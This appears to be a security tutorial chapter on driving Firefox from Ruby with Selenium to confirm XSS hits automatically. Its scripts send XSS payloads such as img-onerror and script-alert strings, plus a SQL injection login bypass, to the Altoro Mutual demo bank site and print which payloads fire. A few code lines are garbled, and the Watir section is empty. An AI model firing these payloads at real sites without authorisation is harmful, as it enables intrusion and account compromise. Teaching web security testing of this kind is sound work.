# Browser Manipulation 
As a hacker, sometimes you need to automate your client side tests (ex. XSS) and reduce the false positives that happen specially in XSS tests. The traditional automation depends on find the sent payload been printed in the response, but it doesn't mean the vulnerability get really exploited so you have to do it manually again and again. 

Here we'll learn to make ruby control our browser in order to simulate the same attacks from from browser and get the real results.

The most known APIs for this task are ***Selenium*** and ***Watir*** which support most know web browsers currently exist.

## Selenium Webdriver
[**Selenium**](https://github.com/seleniumhq/selenium) is an umbrella project encapsulating a variety of tools and libraries enabling web browser automation.

- To install selenium gem
```
gem install selenium-webdriver
```


### GET Request 
```ruby
#!/usr/bin/env ruby
#
#
require "selenium-webdriver"

# Profile Setup and Tweak 
proxy = Selenium::WebDriver::Proxy.newproxy = Selenium::WebDriver::Proxy.new(
  :http     => PROXY,
  :ftp      => PROXY,
  :ssl      => PROXY
)       # Set Proxy hostname and port 
profile = Selenium::WebDriver::Firefox::Profile.from_name "default"     # Use an existing profile name 
profile['general.useragent.override'] = "Mozilla/5.0 (compatible; MSIE 9.0; " + 
                                        "Windows Phone OS 7.5; Trident/5.0; " + 
					                    "IEMobile/9.0)"                 # Set User Agentprofile.proxy = proxy                                                   # Set Proxy
profile.assume_untrusted_certificate_issuer = false                     # Accept untrusted SSL certificates 

# Start Driver 
driver = Selenium::WebDriver.for(:firefox, :profile => profile)         # Start firefox driver with specified profile
# driver = Selenium::WebDriver.for(:firefox, :profile => "default")     # Use this line if just need a current profile and no need to setup or tweak your profile
driver.manage.window.resize_to(500, 400)                                # Set Browser windows size
driver.navigate.to "http://www.altoromutual.com/search.aspx?"           # The URL to navigate 

# Interact with elements
element = driver.find_element(:name, 'txtSearch')   # Find an element named 'txtSearch'
element.send_keys "<img src=x onerror='alert(1)'>"  # Send your keys to element
element.send_keys(:control, 't')                    # Open a new tab
element.submit                                      # Submit the text you've just sent
```


> Note that the actual keys to send depend on your OS, for example, Mac uses `COMMAND + t`, instead of `CONTROL + t`.


### POST Request 
```ruby
#!/usr/bin/env ruby
#
#
require 'selenium-webdriver'

browser = Selenium::WebDriver.for :firefox
browser.get "http://www.altoromutual.com/bank/login.aspx"

wait = Selenium::WebDriver::Wait.new(:timeout => 15)		# Set waiting timeout
# Find the input elements to interact with later.
input = wait.until {
  element_user = browser.find_element(:name, "uid")
  element_pass = browser.find_element(:name, "passw")
  # Retrun array of elements when get displayed
  [element_user, element_pass] if element_user.displayed? and element_pass.displayed?
}

input[0].send_keys("' or 1=1;--")   # Send key for the 1st element 
input[1].send_keys("password")      # Send key fro the next element
sleep 1

# Click/submit the button based the form it is in (you can also call 'btnSubmit' method)
submit = browser.find_element(:name, "btnSubmit").click #.submit

# browser.quit
```


Let's test the page against XSS vulnerability. First I'll list what kind of action we need from browser

1. Open a browser window (Firefox)
2. Navigate to a URL (altoromutual.com)
3. Perform some operations (Send an XSS payload)
4. Check if the payload is working or it's false positive 
5. Print the succeed payloads on terminal

**selenium-xss.rb**
```ruby
#!/usr/bin/env ruby
#
#
require 'selenium-webdriver'

payloads = 
  [ 
    "<video src=x onerror=alert(1);>",
    "<img src=x onerror='alert(2)'>",
    "<script>alert(3)</script>",
    "<svg/OnlOad=prompt(4)>",
    "javascript:alert(5)",
    "alert(/6/.source)"
  ]

browser = Selenium::WebDriver.for :firefox
browser.get "http://www.altoromutual.com/search.aspx?"

wait = Selenium::WebDriver::Wait.new(:timeout => 20)

payloads.each do |payload|
  input = wait.until do
      element = browser.find_element(:name, 'txtSearch')
      element if element.displayed?
  end
  input.send_keys(payload)
  input.submit
  
  begin 
    wait.until do 
      txt = browser.switch_to.alert
      if (1..100) === txt.text.to_i
	puts "Payload is working: #{payload}"
	txt.accept 
      end
    end
  rescue 
    puts "False Positive: #{payload}"
    next
  end
  
end

```

Result
```
./selenium-tabs2.rb 
Payload is working: <video src=x onerror=alert(1);>
Payload is working: <img src=x onerror='alert(2)'>
Payload is working: <script>alert(3)</script>
Payload is working: <svg/OnlOad=prompt(4)>
False Positive: javascript:alert(5)
False Positive: alert(/6/.source)
```



## Watir Webdriver
[**Watir**](http://watirwebdriver.com/) is abbreviation for (Web Application Testing in Ruby)

- To install watir gem
```
gem install watir-webdriver
```


### GET Request 



### POST Request 






<br><br><br>
---
- [Selenium official documentations](http://docs.seleniumhq.org/docs/)
- [Selenium Cheat Sheet](https://gist.github.com/kenrett/7553278) 
- [Selenium webdriver vs Watir-webdriver in Ruby](http://watirmelon.com/2011/05/05/selenium-webdriver-vs-watir-webdriver-in-ruby/)
- [writing automate test scripts in Ruby](https://www.browserstack.com/automate/ruby)